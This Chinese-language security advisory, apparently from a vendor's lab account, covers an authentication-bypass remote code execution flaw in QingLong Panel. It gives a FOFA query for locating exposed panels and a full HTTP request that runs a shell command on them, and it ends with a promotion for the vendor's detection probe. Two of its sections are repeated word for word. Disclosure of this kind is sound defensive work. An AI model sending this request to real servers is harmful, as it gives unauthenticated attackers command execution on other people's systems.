#  【漏洞预警】青龙面板 网站管理系统 command-run 远程代码执行漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-03-04 07:17  
  
**漏洞名称：**  
  
青龙面板 网站管理系统 command-run 远程代码执行漏洞  
  
**组件详情：**  
  
青龙面板（QingLong Panel）是一款开源的定时任务管理平台，支持 Python3、JavaScript、Shell、TypeScript 等多种脚本语言，用于自动化任务调度、脚本运行、依赖管理、通知推送等功能。广泛应用于 NAS、自建服务器、云主机上的签到、薅羊毛、爬虫、自动化运维等场景，默认端口 5700，基于 Node.js + Express 框架开发，提供 Web 管理界面和 API 接口。  
  
**影响范围：**  
- 青龙面板 V2.20.1 及以下版本（包括最新版在内多个主流分支）  
  
- 涉及 /api/system/command-run 接口的部署实例  
  
- 所有公网暴露或未加固的 Docker / 直接部署青龙面板系统  
  
- 其他基于青龙面板的二次开发或镜像版本（如某些 NAS 插件）  
  
**漏洞类型：**  
  
远程代码执行（Remote Code Execution，RCE），结合鉴权绕过（Authentication Bypass）  
  
**利用条件：**  
  
1、用户认证：无需用户认证（预认证远程利用）  
  
2、前置条件：默认配置下面板 Web 服务暴露（端口 5700 开放），Express 路由对大小写不敏感 + URL 重写缺陷  
  
3、触发方式：远程（通过大小写变形路径如 /API/system/command-run 绕过 JWT 鉴权，直接 POST 恶意命令到 command-run 接口执行系统命令）  
  
**综合评价：**  
  
1、用户认证：无需用户认证（预认证远程利用）  
  
2、前置条件：默认配置下面板 Web 服务暴露（端口 5700 开放），Express 路由对大小写不敏感 + URL 重写缺陷  
  
3、触发方式：远程（通过大小写变形路径如 /API/system/command-run 绕过 JWT 鉴权，直接 POST 恶意命令到 command-run 接口执行系统命令）  
  
**官方解决方案：**  
  
青龙面板项目官方已知晓该类问题（2026 年 2 月披露），建议立即：  
  
升级到最新修复版本  
  
  
  
**复现情况**  
  
  
f  
ofa  
：  
icon_hash=="-254502902"  
  
1.执行id命令访问得到结果  
```
PUT /API/system/command-run HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Length: 17
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Content-Type: application/json
Dnt: 1
Upgrade-Insecure-Requests: 1

{"command": "id"}
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrhcqsO1dvkMibUEws9GA3ep0P9vV42FM5iarYWYyiaBocRZEXaf2J0ia0cV9BsJNWOicpQv6pNqPFicnFHyQCHPG24ia9EjSNvEUk2MbI/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "")  
  
2.渝融云NTM入侵检测系统已支持青龙面板攻击检测  
（入侵检测合作可私聊公众号）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrg7cqKia320QPEuRSVZqIFnlaCIgCwiaLsJJTloiciaqnU8JriblW7aV8FqMNEu3BUWPTibRgSicnwD08rUcwelw2N6H6DW6HtcSibkVdQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zriaPmoojAcs6kpXD0a7aF6KxP66x1BllbuQqiaWuvlHPSZpG1EqhOzJ376Gv6iaORVxNhsiaYZmRQKYPqDMiboBS5u7MEUeuuqqqSgM/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/w8NHw6tcQ5wicTzaxopgE26TXk6BicVDCkRV2P7zLEqkMiarB6Gq7gwAfxowKPPDGI0iahiaOkO55LooibEGtWxj9Biag/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
**渝融云解决方案-渝融云NTM全流量分析探针**  
  
**已添加监测规则**  
，可实时监控  
青龙面板 网站管理系统 command-run 远程代码执行漏洞  
  
设备简介：渝融云NTM全流量分析探针是一款集流量分析、威胁检测与行为审计于一体的智能化网络流量监测平台。系统通过对网络全流量的实时采集与深度解析，帮助用户实现网络态势的“全景透视”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgjCibbkmKPIAMud0PoXI7biajGvzcMXE4WUmK6bQ0ttPickjWBWIGGBJ4xvlZowq3ywLhcMx1Zl6XhLpDtNL6B7fe0UGdtYjoSYE/640?wx_fmt=png&from=appmsg "")  
  
